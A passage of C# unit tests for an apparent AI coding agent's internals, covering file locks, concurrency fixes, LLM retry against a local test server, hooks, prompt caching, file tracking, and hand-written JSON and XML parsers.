        var ok = FileLockManager.WaitForLockAsync(path, agentA, TimeSpan.FromSeconds(2)).GetAwaiter().GetResult();
        Check("FileLock: WaitForLock 无锁成功", ok);

        // 10. Agent.AgentId 默认 + 写工具经 _agent_id 报跨槽位锁冲突（资源锁定报错提醒）
        var probeAgent = new Agent(new LLM("test", "sk-test"));
        Check("FileLock: Agent.AgentId 默认 main", probeAgent.AgentId == "main");

        var crossPath = Path.Combine(Path.GetTempPath(), "wc_cross_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        FileLockManager.ReleaseAll("F1");
        FileLockManager.ReleaseAll("F2");
        FileLockManager.TryAcquire(crossPath, "F1");
        var crossResult = new WayCoder.Tools.WriteFileTool().ExecuteAsync(new Dictionary<string, object?> {
            ["file_path"] = crossPath,
            ["content"] = "x",
            ["_agent_id"] = "F2",
        }).GetAwaiter().GetResult();
        Check("FileLock: 跨槽位写报锁冲突(F1)", crossResult.Contains("F1") && crossResult.Contains("锁定"));
        FileLockManager.ReleaseAll("F1");
        FileLockManager.ReleaseAll("F2");
        try { File.Delete(crossPath); } catch { }

        // 清理
        FileLockManager.ReleaseAll(agentA);
        FileLockManager.ReleaseAll(agentB);
    }

    /// <summary>P3 并发竞态修复验证：ModelOverride 恢复 / 线程安全集合 / 后台任务输出 / LRU 回调重入 / 文件锁并发 / LLM 重试。</summary>
    private static void TestP3Concurrency(Action<string, bool> Check)
    {
        // ── 1. WithModelOverrideAsync：异常不污染 ModelOverride ──
        var mLLM = new LLM("big-model", "k");
        mLLM.SmallModel = "small-model";
        mLLM.ModelOverride = null;
        var mr = Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
        {
            await Task.CompletedTask;
            return "done";
        }).GetAwaiter().GetResult();
        Check("P3: WithModelOverride 成功返回", mr == "done");
        Check("P3: WithModelOverride 成功后恢复", mLLM.ModelOverride == null);

        mLLM.ModelOverride = "orig";
        try
        {
            Agent.WithModelOverrideAsync(mLLM, "small-model", async () =>
            {
                await Task.CompletedTask;
                throw new InvalidOperationException("boom");
            }).GetAwaiter().GetResult();
        }
        catch (InvalidOperationException) { }
        Check("P3: WithModelOverride 异常后恢复", mLLM.ModelOverride == "orig");

        // ── 2. ThreadSafeStringSet：并发 Add 去重 + 快照枚举 ──
        var tss = new ThreadSafeStringSet();
        System.Threading.Tasks.Parallel.For(0, 1000, i => tss.Add("file" + (i % 50)));
        Check("P3: ThreadSafeStringSet 并发去重计数", tss.Count == 50);
        var snap = tss.ToList();
        Check("P3: ThreadSafeStringSet 快照", snap.Count == 50);
        Check("P3: ThreadSafeStringSet 包含", tss.Contains("file0") && tss.Contains("file49"));

        // ── 3. BackgroundTask：并发追加输出不丢更新 ──
        var bt = new BackgroundTaskManager.BgTask(1, "echo", DateTime.Now);
        var segs = Enumerable.Range(0, 200).Select(i => $"#{i}#").ToArray();
        System.Threading.Tasks.Parallel.For(0, 200, i => bt.AppendOutput(segs[i]));
        Check("P3: BackgroundTask 并发追加无丢失", segs.All(s => bt.Output.Contains(s)));

        // ── 4. LruCache：OnEvicted 回调内重入不死锁（回调须在锁外触发）──
        bool reentrantOk = true;
        try
        {
            var rc = new LruCache<string, int>(2);
            rc.OnEvicted += (k, _) => { if (k == "a") rc.Put("z", 99); };
            rc.Put("a", 1);
            rc.Put("b", 2);
            rc.Put("c", 3); // 淘汰 a → 回调内 Put("z", 99) 重入
            reentrantOk = rc.Get("z") == 99;
        }
        catch { reentrantOk = false; }
        Check("P3: LruCache OnEvicted 回调重入不死锁", reentrantOk);

        // ── 5. FileLockManager：并发抢锁互斥 + 同 agent 续期 ──
        var racePath = Path.Combine(Path.GetTempPath(), "wc_race_" + Guid.NewGuid().ToString("N")[..6] + ".txt");
        int winners = 0;
        System.Threading.Tasks.Parallel.For(0, 32, i =>
        {
            if (FileLockManager.TryAcquire(racePath, $"race-{i}", TimeSpan.FromSeconds(30)))
                System.Threading.Interlocked.Increment(ref winners);
        });
        Check("P3: FileLock 并发抢锁仅 1 成功", winners == 1);

        // 释放抢锁赢家，避免残留锁污染后续测试的锁列表断言
        var holder = FileLockManager.GetLockInfo(racePath)?.AgentId;
        if (holder != null) FileLockManager.Release(racePath, holder);
        Check("P3: FileLock 抢锁赢家已释放", FileLockManager.GetLockInfo(racePath) == null);

        // 同 agent 并发续期：全部成功（续期幂等，不丢锁）
        Check("P3: FileLock renewer 首获成功", FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)));
        int renewOk = 0;
        System.Threading.Tasks.Parallel.For(0, 32, i =>
        {
            if (FileLockManager.TryAcquire(racePath, "renewer", TimeSpan.FromSeconds(30)))
                System.Threading.Interlocked.Increment(ref renewOk);
        });
        Check("P3: FileLock 同 agent 并发续期全部成功", renewOk == 32);
        FileLockManager.Release(racePath, "renewer");

        // ── 6. LLM 5xx 重试（响应释放 + 重试成功）──
        var retryServer = new WayCoder.UI.Web.HttpServer(0);
        int attempts = 0;
        retryServer.OnRequest = _ =>
        {
            int n = System.Threading.Interlocked.Increment(ref attempts);
            if (n < 3)
                return new WayCoder.UI.Web.HttpResponse { Status = 500, Reason = "Internal Server Error", Body = Encoding.UTF8.GetBytes("server error") };
            var sse = "data: {\"choices\":[{\"delta\":{\"content\":\"hello\"}}]}\n\n" +
                      "data: {\"choices\":[{\"delta\":{\"content\":\"world\"}}]}\n\n" +
                      "data: [DONE]\n\n";
            return WayCoder.UI.Web.HttpResponse.JsonBody(sse);
        };
        retryServer.Start();
        try
        {
            var retryLlm = new LLM("test-model", "test-key", $"http://127.0.0.1:{retryServer.ActualPort}");
            var r = retryLlm.ChatAsync(new List<JNode> { JNode.Object().Set("role", "user").Set("content", "hi") }).GetAwaiter().GetResult();
            Check("P3: LLM 5xx 重试后成功", r.Content.Contains("hello"));
            Check("P3: LLM 重试发起 ≥3 次请求", attempts >= 3);
        }
        catch (Exception ex)
        {
            DebugLog.Log("selftest", "LLM retry test: " + ex);
            Check("P3: LLM 5xx 重试后成功", false);
        }
        finally { retryServer.Stop(); }
    }

    /// <summary>跨平台运行器选择（CrossPlatform）单元测试：shell/python 可执行文件与参数标志。</summary>
    private static void TestCrossPlatform(Action<string, bool> Check)
    {
        Check("XPlat: IsWindows 与系统一致", CrossPlatform.IsWindows == OperatingSystem.IsWindows());
        Check("XPlat: ShellExecutable 合法", CrossPlatform.ShellExecutable is "cmd.exe" or "/bin/bash");
        Check("XPlat: PythonExecutable 合法", CrossPlatform.PythonExecutable is "python" or "python3");
        Check("XPlat: ShellArgs 用对标志",
            CrossPlatform.ShellArgs("echo hi").StartsWith(CrossPlatform.IsWindows ? "/c" : "-c"));
        // Unix 分支需对内层引号转义（bash -c 语义），Windows 分支无需转义
        if (!CrossPlatform.IsWindows)
            Check("XPlat: Unix ShellArgs 转义内层引号", CrossPlatform.ShellArgs("echo \"hi\"").Contains("\\\""));
    }

    /// <summary>文件追踪器（FileTracker）单元测试：stale-read 检测 + 先读后改保护 + 删除/禁用。</summary>
    private static void TestFileTracker(Action<string, bool> Check)
    {
        var tmp = Path.Combine(Path.GetTempPath(), "wc_track_" + Guid.NewGuid().ToString("N")[..6]);
        Directory.CreateDirectory(tmp);
        var f = Path.Combine(tmp, "a.txt");
        var f2 = Path.Combine(tmp, "b.txt");

        FileTracker.Enabled = true;
        FileTracker.Reset();

        try
        {
            // 1. 初始未追踪
            File.WriteAllText(f, "v1");
            Check("FileTrack: 未追踪返回 (false,false)", FileTracker.GetStatus(f) == (false, false));

            // 2. RecordRead 记录哈希
            FileTracker.RecordRead(f);
            Check("FileTrack: RecordRead 后 (true,false)", FileTracker.GetStatus(f) == (true, false));

            // 3. 外部修改检测（哈希变更）
            File.WriteAllText(f, "v2");
            Check("FileTrack: 外部修改后 (true,true)", FileTracker.GetStatus(f) == (true, true));
            var changes = FileTracker.CheckForChanges();
            Check("FileTrack: CheckForChanges 检出", changes.Any(p => Path.GetFileName(p) == "a.txt"));

            // 4. RecordWrite 更新哈希 → 不再 stale
            FileTracker.RecordWrite(f);
            Check("FileTrack: RecordWrite 后 (true,false)", FileTracker.GetStatus(f) == (true, false));

            // 5. 删除检测 + 移除追踪
            File.Delete(f);
            var deleted = FileTracker.CheckForChanges();
            Check("FileTrack: 删除检出", deleted.Any(p => Path.GetFileName(p) == "a.txt"));
            Check("FileTrack: 删除后不再追踪", FileTracker.GetStatus(f) == (false, false));

            // 6. ValidatePreEdit 未读取警告
            File.WriteAllText(f2, "x");
            Check("FileTrack: 未读取编辑警告", FileTracker.ValidatePreEdit(f2)?.Contains("尚未被 read_file") == true);

            // 7. ValidatePreEdit 已读取未修改 → 通过（null）
            FileTracker.RecordRead(f2);
            Check("FileTrack: 已读取未修改通过", FileTracker.ValidatePreEdit(f2) == null);

            // 8. GetChangeWarning 检出外部修改
            File.WriteAllText(f2, "y");
            Check("FileTrack: 变更警告非空", FileTracker.GetChangeWarning()?.Contains("文件变更警告") == true);

            // 9. Enabled=false 短路
            FileTracker.Enabled = false;
            Check("FileTrack: 禁用后 GetStatus 短路", FileTracker.GetStatus(f2) == (false, false));
            FileTracker.Enabled = true;

            // 10. Reset 清空
            FileTracker.Reset();
            Check("FileTrack: Reset 后未追踪", FileTracker.GetStatus(f2) == (false, false));
        }
        finally
        {
            FileTracker.Enabled = true;
            FileTracker.Reset();
            try { Directory.Delete(tmp, recursive: true); } catch { }
        }
    }

    /// <summary>Prompt 缓存追踪（PromptCache）单元测试：哈希命中/未命中/命中率/节省 token/禁用。</summary>
    private static void TestPromptCache(Action<string, bool> Check)
    {
        PromptCache.Enabled = true;
        PromptCache.ClearStats();

        // 1. 首次未命中
        Check("PromptCache: 首次未命中", !PromptCache.RecordRequest("sys1", "tools1", 100, 50));
        Check("PromptCache: 首次后 1 请求 0 命中", PromptCache.TotalRequests == 1 && PromptCache.CacheHits == 0);

        // 2. 相同请求命中 + 节省 token 累计
        Check("PromptCache: 相同请求命中", PromptCache.RecordRequest("sys1", "tools1", 100, 50));
        Check("PromptCache: 命中后 2 请求 1 命中", PromptCache.TotalRequests == 2 && PromptCache.CacheHits == 1);
        Check("PromptCache: 节省 token=150", PromptCache.SavedTokens == 150);

        // 3. 不同 system 未命中
        Check("PromptCache: 不同 system 未命中", !PromptCache.RecordRequest("sys2", "tools1", 100, 50));

        // 4. 不同 tools 未命中
        Check("PromptCache: 不同 tools 未命中", !PromptCache.RecordRequest("sys2", "tools2", 100, 50));

        // 5. HitRate = 1/4 = 25%
        Check("PromptCache: HitRate 计算", Math.Abs(PromptCache.HitRate - 25.0) < 0.01);

        // 6. Reset 后相同请求又未命中
        PromptCache.Reset();
        Check("PromptCache: Reset 后未命中", !PromptCache.RecordRequest("sys2", "tools2", 100, 50));

        // 7. Enabled=false 短路 + 摘要「关闭」
        PromptCache.ClearStats();
        PromptCache.Enabled = false;
        Check("PromptCache: 禁用后未命中", !PromptCache.RecordRequest("sys1", "tools1", 100, 50));
        Check("PromptCache: 禁用摘要含关闭", PromptCache.Summary().Contains("关闭"));
        PromptCache.Enabled = true;

        // 8. Summary 命中率 + K 格式（1500 tokens → 1.5K）
        PromptCache.ClearStats();
        PromptCache.RecordRequest("sys1", "tools1", 1000, 500);
        PromptCache.RecordRequest("sys1", "tools1", 1000, 500);
        var summary = PromptCache.Summary();
        Check("PromptCache: Summary 含命中率", summary.Contains("命中率"));
        Check("PromptCache: Summary 含 K 格式", summary.Contains("1.5K"));

        PromptCache.ClearStats();
    }

    /// <summary>Hook 系统（HooksManager）单元测试：session hook 注册/事件执行/匹配器/输出协议解析。</summary>
    private static void TestHooksManager(Action<string, bool> Check)
    {
        HooksManager.Enabled = true;
        HooksManager.ClearSessionHooks();

        // 1. PreToolUse session hook 阻止（返回 reason）
        var id1 = HooksManager.RegisterSessionHook(HookEvent.PreToolUse,
            ctx => Task.FromResult<HookOutput?>(new HookOutput { Decision = "block", Reason = "测试阻止" }));
        var block = HooksManager.RunPreToolUseAsync("bash", new Dictionary<string, object?> { ["cmd"] = "ls" }).GetAwaiter().GetResult();
        Check("Hook: PreToolUse 阻止返回原因", block?.Contains("测试阻止") == true);

        // 2. 注销后放行
        HooksManager.UnregisterSessionHook(id1);
        Check("Hook: 注销后放行",
            HooksManager.RunPreToolUseAsync("bash", new Dictionary<string, object?>()).GetAwaiter().GetResult() == null);

        // 3. Continue=true 放行
        HooksManager.RegisterSessionHook(HookEvent.PreToolUse,
            ctx => Task.FromResult<HookOutput?>(new HookOutput { Continue = true }));
        Check("Hook: Continue=true 放行",
            HooksManager.RunPreToolUseAsync("bash", new Dictionary<string, object?>()).GetAwaiter().GetResult() == null);
        HooksManager.ClearSessionHooks();

        // 4. PostToolUse 返回 AdditionalContext
        HooksManager.RegisterSessionHook(HookEvent.PostToolUse,
            ctx => Task.FromResult<HookOutput?>(new HookOutput { AdditionalContext = "后处理结果" }));
        Check("Hook: PostToolUse 返回附加上下文",
            HooksManager.RunPostToolUseAsync("bash", new Dictionary<string, object?>(), "ok").GetAwaiter().GetResult() == "后处理结果");
        HooksManager.ClearSessionHooks();

        // 5. Stop 返回 AdditionalContext
        HooksManager.RegisterSessionHook(HookEvent.Stop,
            ctx => Task.FromResult<HookOutput?>(new HookOutput { AdditionalContext = "stop-ctx" }));
        Check("Hook: Stop 返回上下文", HooksManager.RunStopAsync().GetAwaiter().GetResult() == "stop-ctx");
        HooksManager.ClearSessionHooks();

        // 6. 事件隔离：PreToolUse hook 不触发 Stop
        HooksManager.RegisterSessionHook(HookEvent.PreToolUse,
            ctx => Task.FromResult<HookOutput?>(new HookOutput { AdditionalContext = "wrong-event" }));
        Check("Hook: 事件隔离", HooksManager.RunStopAsync().GetAwaiter().GetResult() == null);
        HooksManager.ClearSessionHooks();

        // 7. MatchesPattern（空/* 全匹配、管道、正则、无效正则回退）
        Check("Hook: 空 matcher 全匹配", HooksManager.MatchesPattern("bash", null));
        Check("Hook: * 全匹配", HooksManager.MatchesPattern("bash", "*"));
        Check("Hook: 管道命中", HooksManager.MatchesPattern("bash", "bash|git|rm"));
        Check("Hook: 管道未命中", !HooksManager.MatchesPattern("ls", "bash|git|rm"));
        Check("Hook: 正则命中", HooksManager.MatchesPattern("WriteFile", "^Write"));
        Check("Hook: 正则未命中", !HooksManager.MatchesPattern("ReadFile", "^Write"));
        Check("Hook: 无效正则回退精确命中", HooksManager.MatchesPattern("(", "("));
        Check("Hook: 无效正则回退精确未命中", !HooksManager.MatchesPattern("(", "x"));

        // 8. ParseHookOutput（JSON 协议 / exitCode 2 / 纯文本回退 / 空输出）
        Check("Hook: JSON 解析 Decision",
            HooksManager.ParseHookOutput("{\"Decision\":\"block\",\"Reason\":\"r\"}", 0)?.Decision == "block");
        Check("Hook: exitCode 2 → block", HooksManager.ParseHookOutput("阻止文本", 2)?.Decision == "block");
        Check("Hook: 纯文本回退", HooksManager.ParseHookOutput("纯文本输出", 0)?.AdditionalContext == "纯文本输出");
        Check("Hook: 空输出 → null", HooksManager.ParseHookOutput("", 0) == null);

        // 9. SnakeCase（PascalCase → snake_case）
        Check("Hook: SnakeCase 常规", HooksManager.SnakeCase("PreToolUse") == "pre_tool_use");
        Check("Hook: SnakeCase 单词", HooksManager.SnakeCase("Stop") == "stop");

        HooksManager.ClearSessionHooks();
    }

    // 手搓 JSON 库（AOT 安全零反射）：解析/DOM/序列化/转义/错误分支
    private static void TestJsonLib(Action<string, bool> Check)
    {
        // 1. 标量解析
        Check("Json: 整数解析", Json.Parse("123")?.AsNumber() == 123);
        Check("Json: 负数解析", Json.Parse("-42.5")?.AsNumber() == -42.5);
        Check("Json: 指数解析", Json.Parse("1e3")?.AsNumber() == 1000);
        Check("Json: true 解析", Json.Parse("true")?.AsBool() == true);
        Check("Json: false 解析", Json.Parse("false")?.AsBool() == false);
        Check("Json: null 解析", Json.Parse("null")?.IsNull == true);
        Check("Json: 字符串解析", Json.Parse("\"hello\"")?.AsString() == "hello");

        // 2. 对象解析
        var obj = Json.Parse("{\"a\":1,\"b\":\"x\",\"c\":true}");
        Check("Json: 对象字段数", obj?.Count == 3);
        Check("Json: 对象取数字", obj?.GetNumber("a") == 1);
        Check("Json: 对象取字符串", obj?.GetString("b") == "x");
        Check("Json: 对象取布尔", obj?.GetBool("c") == true);
        Check("Json: 对象 Has", obj?.Has("a") == true && obj?.Has("z") == false);

        // 3. 数组解析
        var arr = Json.Parse("[1,2,3]");
        Check("Json: 数组长度", arr?.Count == 3);
        Check("Json: 数组下标", arr?.At(1)?.AsNumber() == 2);
        Check("Json: 数组 Items", arr?.Items.Count() == 3);

        // 4. 嵌套
        var nested = Json.Parse("{\"a\":{\"b\":[10,20]}}");
        Check("Json: 嵌套取值", nested?.Get("a")?.Get("b")?.At(1)?.AsNumber() == 20);

        // 5. 转义
        Check("Json: 转义序列", Json.Parse("\"a\\nb\\t\\\"\\\\\"")?.AsString() == "a\nb\t\"\\");
        Check("Json: \\u 中文", Json.Parse("\"\\u4e2d\\u6587\"")?.AsString() == "中文");
        Check("Json: 代理对 emoji", Json.Parse("\"\\ud83d\\ude00\"")?.AsString() == "\U0001F600");

        // 6. 非法输入
        Check("Json: 非法 JSON 拒绝", !Json.TryParse("{bad}", out _));
        Check("Json: 尾随逗号拒绝", !Json.TryParse("[1,]", out _));
        Check("Json: 未闭合对象拒绝", !Json.TryParse("{\"a\":1", out _));
        Check("Json: 空字符串返回 null", Json.Parse("") == null && !Json.TryParse("", out _));

        // 6b. 截断 JSON 健壮性 —— 逐位置截断合法输入，验证解析器不崩溃/不挂起、异常受控
        {
            var truncationSources = new[]
            {
                "{\"a\":1,\"b\":\"hello\",\"c\":[1,2,3],\"d\":{\"e\":true,\"f\":null}}",
                "[1,2,3,4,5]",
                "{\"nested\":{\"deep\":{\"deeper\":[{\"x\":1},{\"y\":2}]}}}",
                "\"a string with escapes \\n\\t\\\" and unicode \\u4e2d\"",
                "{\"unicode\":\"\\ud83d\\ude00\",\"num\":-12.5e3}",
            };

            int tryParseThrew = 0;   // TryParse 抛了异常（不应发生）
            int parseWrongExc = 0;   // Parse 抛了 JsonParseException 之外的异常（不应发生）
            int parseSuccessAtPrefix = 0; // 截断前缀恰好仍是合法 JSON（允许，非错误）

            foreach (var full in truncationSources)
            {
                for (int len = 0; len <= full.Length; len++)
                {
                    var truncated = full[..len];

                    // TryParse 对任何输入（含截断）永不抛异常，只返回 true/false
                    try { Json.TryParse(truncated, out _); }
                    catch { tryParseThrew++; }

                    // Parse 要么成功，要么抛 JsonParseException（受控），绝不抛其它异常类型
                    try { Json.Parse(truncated); parseSuccessAtPrefix++; }
                    catch (JsonParseException) { }
                    catch { parseWrongExc++; }
                }
            }

            Check("Json: 截断输入 TryParse 永不抛异常", tryParseThrew == 0);
            Check("Json: 截断输入 Parse 仅抛 JsonParseException", parseWrongExc == 0);

            // 明确断言的典型截断/畸形样例（TryParse 拒绝、Parse 抛受控异常）
            string[] malformed =
            {
                "{\"a\":",          // 值被截断
                "{\"a\":1,",        // 逗号后缺内容
                "[1,2",             // 数组未闭合
                "[1,2,",            // 逗号后缺内容
                "\"abc",            // 字符串未闭合
                "\"abc\\",          // 转义被截断
                "\"\\u12",          // unicode 转义不完整
                "\"\\ud83d",        // 高代理后缺低代理
                "1.",               // 小数点后缺数字
                "1e",               // 指数后缺数字
                "-",                // 负号后缺数字
                "tru",              // true 被截断
                "fals",             // false 被截断
                "nul",              // null 被截断
                "{\"a\":1}x",       // 根值后多余内容
            };
            int malformedAccepted = 0;
            foreach (var m in malformed)
                if (Json.TryParse(m, out _)) malformedAccepted++;
            Check("Json: 典型畸形输入全部拒绝", malformedAccepted == 0);
        }

        // 7. 序列化往返（数字保真）
        Check("Json: 往返对象", Json.Serialize(Json.Parse("{\"a\":1}")!) == "{\"a\":1}");
        Check("Json: 往返数组", Json.Serialize(Json.Parse("[1,\"x\",true,null]")!) == "[1,\"x\",true,null]");
        Check("Json: 缩进含换行", Json.Serialize(Json.Parse("{\"a\":1}")!, true).Contains('\n'));

        // 8. 序列化转义
        Check("Json: 序列化转义", Json.Serialize(JNode.Str("a\"b\nc")) == "\"a\\\"b\\nc\"");

        // 9. DOM 操作
        var dom = JNode.Object().Set("a", 1).Set("b", "x").Set("a", 2);
        Check("Json: DOM Set 覆盖", dom.Count == 2 && dom.GetNumber("a") == 2);
        var domArr = JNode.Array().Add(1).Add("y");
        Check("Json: DOM Add", domArr.Count == 2 && domArr.At(1)?.AsString() == "y");

        // 9b. JNode.From 类型分派（替代 JsonValue.Create）
        Check("Json: From null", JNode.From(null).IsNull);
        Check("Json: From string", JNode.From("abc").AsString() == "abc");
        Check("Json: From bool", JNode.From(true).AsBool());
        Check("Json: From int", JNode.From(7).AsNumber() == 7);
        Check("Json: From double", JNode.From(3.5).AsNumber() == 3.5);
        Check("Json: From JNode 恒等", ReferenceEquals(JNode.From(domArr), domArr));
        Check("Json: From 序列化", Json.Serialize(JNode.Object().Set("x", JNode.From(1))) == "{\"x\":1}");

        // 10. SerializeValue（无反射）
        Check("Json: SerializeValue null", Json.SerializeValue(null) == "null");
        Check("Json: SerializeValue string", Json.SerializeValue("x") == "\"x\"");
        Check("Json: SerializeValue int", Json.SerializeValue(42) == "42");
        Check("Json: SerializeValue bool", Json.SerializeValue(true) == "true");
        Check("Json: SerializeValue list", Json.SerializeValue(new List<int> { 1, 2 }) == "[1,2]");
        Check("Json: SerializeValue dict", Json.SerializeValue(new Dictionary<string, object?> { ["k"] = 1 }) == "{\"k\":1}");

        // 11. Clone 深拷贝
        var src = Json.Parse("{\"a\":[1,2]}");
        var cp = src?.Clone();
        Check("Json: Clone 深拷贝", cp != null && Json.Serialize(cp) == Json.Serialize(src!));

        // 12. SlotConfig 手搓往返（零反射，替代 JsonSerializer.Deserialize<SlotConfig>）
        var slot = new AgentSlotConfig.SlotConfig
        {
            LargeModel = "deepseek-v4-pro",
            SmallModel = "deepseek-v4-flash",
            BaseUrl = "https://api.deepseek.com",
            ApiKeyProviderId = "deepseek",
            ApiKey = null,
            UseGlobal = false,
        };
        var slotNode = AgentSlotConfig.SlotToNode(slot);
        Check("Json: Slot 键名 PascalCase", slotNode.Has("LargeModel") && !slotNode.Has("largeModel"));
        var slotBack = AgentSlotConfig.SlotFromNode(slotNode);
        Check("Json: Slot 往返 LargeModel", slotBack.LargeModel == "deepseek-v4-pro");
        Check("Json: Slot 往返 SmallModel", slotBack.SmallModel == "deepseek-v4-flash");
        Check("Json: Slot 往返 BaseUrl", slotBack.BaseUrl == "https://api.deepseek.com");
        Check("Json: Slot 往返 ProviderId", slotBack.ApiKeyProviderId == "deepseek");
        Check("Json: Slot 往返 UseGlobal", slotBack.UseGlobal == false);
        Check("Json: Slot null 字段往返", slotBack.ApiKey == null);

        // 序列化往返（模拟保存/加载的 JSON 文本，经手搓 Json 库）
        var slotParsed = AgentSlotConfig.SlotFromNode(Json.Parse(Json.Serialize(slotNode))!);
        Check("Json: Slot 序列化往返", slotParsed.LargeModel == "deepseek-v4-pro" && slotParsed.UseGlobal == false);

        // UseGlobal 缺省 → true（与 JsonSerializer 属性初始化语义一致）
        var defaultSlot = AgentSlotConfig.SlotFromNode(JNode.Object());
        Check("Json: Slot UseGlobal 缺省为 true", defaultSlot.UseGlobal == true);

        // 13. 嵌套缩进美化（FetchTool.PrettyPrintJson 依赖 Json.Serialize(indent)）
        Check("Json: 嵌套缩进美化", Json.Serialize(Json.Parse("{\"a\":[1]}")!, true).Contains("\n  \"a\""));
    }

    // 手搓 XML 库（AOT 安全零反射）：解析/DOM/实体/CDATA/序列化/错误分支
    private static void TestXmlLib(Action<string, bool> Check)
    {
        // 1. 基础元素
        var root = Xml.Parse("<root/>");
        Check("Xml: 空元素", root?.Name == "root" && root?.Children.Count() == 0);
        Check("Xml: 文本内容", Xml.Parse("<a>x</a>")?.InnerText() == "x");

        // 2. 属性
        var attr = Xml.Parse("<a id=\"1\" name='x'/>");
        Check("Xml: 属性双引号", attr?.GetAttr("id") == "1");
        Check("Xml: 属性单引号", attr?.GetAttr("name") == "x");
        Check("Xml: HasAttr", attr?.HasAttr("id") == true && attr?.HasAttr("z") == false);

        // 3. 嵌套
        var nest = Xml.Parse("<a><b>1</b><c>2</c></a>");
        Check("Xml: Find 子元素", nest?.Find("b")?.InnerText() == "1");
        Check("Xml: FindAll 计数", nest?.FindAll("c").Count() == 1);
        Check("Xml: InnerText 递归拼接", nest?.InnerText() == "12");

        // 4. 实体
        Check("Xml: 预定义实体", Xml.Parse("<a>&lt;tag&gt; &amp; &quot; &apos;</a>")?.InnerText() == "<tag> & \" '");
        Check("Xml: 数字字符引用", Xml.Parse("<a>&#65;&#x42;</a>")?.InnerText() == "AB");

        // 5. CDATA
        Check("Xml: CDATA 保留原样", Xml.Parse("<a><![CDATA[<b>raw</b>]]></a>")?.InnerText() == "<b>raw</b>");

        // 6. 声明/注释/DOCTYPE 跳过
        Check("Xml: 声明跳过", Xml.Parse("<?xml version=\"1.0\"?><root/>")?.Name == "root");
        Check("Xml: 注释跳过", Xml.Parse("<!-- c --><root/>")?.Name == "root");
        Check("Xml: DOCTYPE 跳过", Xml.Parse("<!DOCTYPE root><root/>")?.Name == "root");

        // 7. 序列化
        Check("Xml: 空元素序列化", Xml.Serialize(XNode.Element("a")) == "<a/>");
        Check("Xml: 文本转义序列化", Xml.Serialize(XNode.Element("a").AddText("<&>")) == "<a>&lt;&amp;&gt;</a>");
        Check("Xml: 属性转义序列化", Xml.Serialize(XNode.Element("a").Attr("v", "\"q\"")) == "<a v=\"&quot;q&quot;\"/>");
        Check("Xml: 缩进含换行", Xml.Serialize(XNode.Element("a").Add(XNode.Element("b")), true).Contains('\n'));

        // 8. 解析序列化往返
        var xml = "<a id=\"1\"><b>x &amp; y</b><c/></a>";
        Check("Xml: 往返", Xml.Serialize(Xml.Parse(xml)!) == xml);

        // 9. 非法输入
        Check("Xml: 未闭合拒绝", !Xml.TryParse("<a>", out _));
        Check("Xml: 标签不匹配拒绝", !Xml.TryParse("<a></b>", out _));
        Check("Xml: 空返回 null", Xml.Parse("") == null && !Xml.TryParse("", out _));

        // 10. DOM 操作
        var dom = XNode.Element("root").Attr("k", "v").Add(XNode.Element("child"));
        Check("Xml: DOM Attr", dom.GetAttr("k") == "v");
        Check("Xml: DOM Add", dom.Find("child") != null);
    }

    /// <summary>运行轨迹（Trajectory）单元测试：截断纯函数 + Enabled 标志 + JSONL 事件流落盘/读回。</summary>
    private static void TestTrajectory(Action<string, bool> Check)
    {
        // ── 1. Truncate 纯函数（头尾保留 + 省略标记）──
        Check("Traj: 短文本不截断", Trajectory.Truncate("hello", 100) == "hello");
        Check("Traj: null 不截断", Trajectory.Truncate(null!, 100) == null);
        Check("Traj: 空串不截断", Trajectory.Truncate("", 100) == "");
        var longText = new string('A', 3000);
        var truncated = Trajectory.Truncate(longText, 2000);
        Check("Traj: 截断含标记", truncated.Contains("已截断"));
        Check("Traj: 截断保留头", truncated.StartsWith(new string('A', 1200)));
        Check("Traj: 截断保留尾", truncated.EndsWith(new string('A', 2000 - 1200 - "\n…[已截断]…\n".Length)));
        Check("Traj: 极小 maxChars 只留头", Trajectory.Truncate(longText, 10) == "AAAAAAAAAA");

        // ── 2. Enabled 标志（默认开，未设 WAYCODER_TRAJECTORY）──
        Check("Traj: Enabled 默认开", Trajectory.Enabled);

        // ── 3. 完整事件流：Create → RecordTurn → RecordTool → End → JSONL 读回 ──
        var dir = Path.Combine(Path.GetTempPath(), "waycoder-trajectory-test-" + Guid.NewGuid().ToString("N"));
        try
        {
            var t = Trajectory.Create("test-model", "session-1", dir);
            Check("Traj: Create 非空", t != null);
            if (t != null)
            {
                Check("Traj: 文件已创建", File.Exists(t.FilePath));
                t.RecordTurn(0, 100, 50, 200, 1, 0);
                t.RecordTurn(1, 150, 60, 10, 0, 300);
                t.RecordTool("write_file", "{\"path\":\"/tmp/a.cs\"}", "已写入 12 行", true, 42);
                t.RecordTool("bash", "ls", "运行命令时出错", false, 7);
                t.End();

                var lines = File.ReadAllLines(t.FilePath);
                Check("Traj: 6 个事件", lines.Length == 6);

                var types = new List<string>();
                bool allParse = true, allSchema = true, allVersion = true;
                foreach (var line in lines)
                {
                    var ev = Json.Parse(line);
                    if (ev == null) { allParse = false; continue; }
                    if (ev["traceSchema"]?.AsString() != "waycoder-trajectory") allSchema = false;
                    if (ev["schemaVersion"]?.AsNumber() != 1) allVersion = false;
                    types.Add(ev["type"]?.AsString() ?? "");
                }
                Check("Traj: 每行可解析", allParse);
                Check("Traj: traceSchema 正确", allSchema);
                Check("Traj: schemaVersion 正确", allVersion);
                Check("Traj: 事件类型顺序",
                    string.Join(",", types) == "run_start,llm_turn,llm_turn,tool_call,tool_call,run_end");

                // run_end 汇总字段（累计轮次 + 总 token）
                var last = Json.Parse(lines[^1]);
                Check("Traj: run_end rounds", last!["data"]?["rounds"]?.AsNumber() == 2);
                Check("Traj: run_end totalTokens", last!["data"]?["totalTokens"]?.AsNumber() == 100 + 50 + 150 + 60);

                // tool_call 成败/名称
                var toolOk = Json.Parse(lines[3]);
                Check("Traj: tool_call name", toolOk!["data"]?["name"]?.AsString() == "write_file");
                Check("Traj: tool_call ok=true", toolOk!["data"]?["ok"]?.AsBool() == true);
                var toolFail = Json.Parse(lines[4]);
                Check("Traj: tool_call ok=false", toolFail!["data"]?["ok"]?.AsBool() == false);
            }
        }
        finally
        {
            try { Directory.Delete(dir, true); } catch { }
        }
    }

    /// <summary>手搓 PDF 解析器测试：结构解析 + 文本提取 + 编码 + 错误分支</summary>
    private static void TestPdf(Action<string, bool> Check)
    {
        // ── 1. 最小 PDF 构造 → 解析 ──
        var pdfBytes = BuildMinimalPdf();
        var parser = PdfParser.Open(pdfBytes);
